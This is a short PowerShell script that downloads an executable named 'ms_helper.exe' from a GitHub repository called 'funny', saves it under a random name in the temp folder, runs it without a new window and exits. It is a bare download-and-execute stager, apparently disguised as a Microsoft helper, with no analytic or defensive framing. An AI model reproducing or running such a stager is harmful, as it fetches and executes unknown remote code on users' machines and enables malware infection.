$randomName = [System.IO.Path]::GetRandomFileName().Replace(".tmp", ".exe")
$tempPath = [System.IO.Path]::GetTempPath()
$filePath = Join-Path $tempPath $randomName
Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/raw/refs/heads/main/ms_helper.exe" -OutFile $filePath
Start-Process -FilePath $filePath -NoNewWindow
Exit
